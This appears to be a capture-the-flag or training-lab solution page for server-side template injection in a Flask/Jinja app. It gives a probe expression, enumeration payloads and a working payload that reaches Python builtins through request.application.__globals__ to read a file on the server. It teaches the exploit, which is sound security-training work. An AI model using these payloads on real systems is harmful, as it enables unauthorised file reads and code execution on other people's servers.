Why this is vulnerable

User-controlled strings are evaluated as templates. Attackers can reach config, call Python builtins, or leverage objects to access host resources.

Need a nudge?

Solution

Toggle solution
  1. Prove code execution. Submit {{ '{{ 7 * 7 }}' }} to confirm expressions are evaluated.
  2. Enumerate context. Use {{ '{{ config.items() }}' }} or {{ '{{ request.__dict__ }}' }} to discover objects exposed to the template.
  3. Read the flag. Jinja exposes Flask globals, so run {{ "{{ request.application.__globals__.__builtins__.open('flag.txt').read() }}" }} to cat the file on the server.
Why it works

request.application leads to Flask internals, letting you reach the raw __builtins__ namespace and call open().
